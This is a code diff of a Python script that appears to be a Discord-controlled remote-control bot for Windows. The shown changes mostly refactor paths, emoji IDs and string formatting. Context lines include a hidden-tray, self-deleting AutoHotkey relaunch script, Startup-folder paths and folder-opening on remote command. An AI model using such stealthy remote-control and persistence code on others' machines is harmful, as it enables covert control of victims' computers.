@@ -51,12 +51,15 @@ is_privates = []
 login = os.getenv("COMPUTERNAME")  # login of PC
 file_name = os.path.dirname(__file__) + "/" + os.path.basename(__file__)  # file_name = os.path.basename(__file__)
 
+login_name = os.getlogin()
+
 paths = dict()
 paths["APPDATA"] = os.getenv("APPDATA")
-paths["STARTUP"] = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+paths["DESKTOP"] = f"C:\\Users\\{login_name}\\Desktop"
+paths["STARTUP"] = f"C:\\Users\\{login_name}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 
 app_data = os.getenv("APPDATA")
-login_name = os.getlogin()
+
 start_up = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
 os.chdir(app_data)  # Сделать папкой по умолчанию
 
@@ -76,16 +79,18 @@ with open(os.path.dirname(__file__) + "/TOKEN") as f:
 
 id_fruits = [
     '504731857670242325',
-    "504731916423921664",
+    '504731916423921664',
     '504732125996515339',
     '504732177162829839',
     '504732162805727232',
+
     '504732420210425856',
     '504732459808587845',
     '504732435813236756',
     '504732015728394271',
     '504731807368085537',
     '504731761817944064',
+
     '504731586466545705',
     '504731550424891418'
 ]
@@ -805,12 +810,12 @@ class Scripts:
     async def give_reload():
         try:
             # FileDelete, %A_AppData%\%A_ScriptName%
-            command = """#NoTrayIcon
+            command = f"""#NoTrayIcon
                 #SingleInstance force
                 FileDelete, %A_ScriptName%
                 sleep 5000
-                Run, {a}
-                ExitApp""".format(a=file_name)
+                Run, {file_name}
+                ExitApp"""
             File.write(command, "reload.ahk")
             start('reload.ahk')
             #  await Discord.send_embed(description="I am will reload.")
@@ -842,21 +847,14 @@ class Scripts:
 
     @staticmethod
     async def emoji():
-        emojies = {"turnip": "<:turnip:504731857670242325>",
-                   "raspberry": "<:raspberry:504731916423921664>",
-                   "pomegranate": "<:pomegranate:504732125996515339>",
-                   "pearer": "<:pearer:504732177162829839>",
-                   "orange": "<:orange:504732162805727232>",
-                   "mango": "<:mango:504732420210425856>",
-                   "lime": "<:lime:504732459808587845>",
-                   "lettuce": "<:lettuce:504732435813236756>",
-                   "corner": "<:corner:504731807368085537>",
-                   "cherry": "<:cherry:504731761817944064>",
-                   "blackberry": "<:blackberry:504731586466545705>",
-                   "banane": "<:banane:504731550424891418>"}
+        sprites_name = ["turnip", "raspberry", "pomegranate", "pearer", "orange",
+                        "mango", "lime", "lettuce", "dye_bluebell", "corner",
+                        "cherry", "blackberry", "banane"
+                        ]
+        sprites = ["<:{name}:{id}".format(name=sprites_name[i], id=id_fruits[i]) for i in range(len(id_fruits))]
         description = ""
-        for i in emojies.keys():
-            description = description + emojies[i] + "\n"
+        for sprite in sprites:
+            description += sprite + "\n"
 
         await Discord.send_embed(description=description)
 
@@ -1155,13 +1153,11 @@ class Scripts:
         if path:
             try:
                 if path == "APPDATA":
-                    start("C:\\Users\\{}\\AppData".format(os.getlogin()))
+                    start(f"C:\\Users\\{login_name}\\AppData")
                 elif path == "STARTUP":
-                    start(
-                        "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup".format(
-                            os.getlogin()))
+                    start(paths["STARTUP"])
                 elif path == "DESKTOP":
-                    start("C:\\Users\\{}\\Desktop".format(os.getlogin()))
+                    start(paths["DESKTOP"])
                 else:
                     start(path)
                 await message.add_reaction("👍")
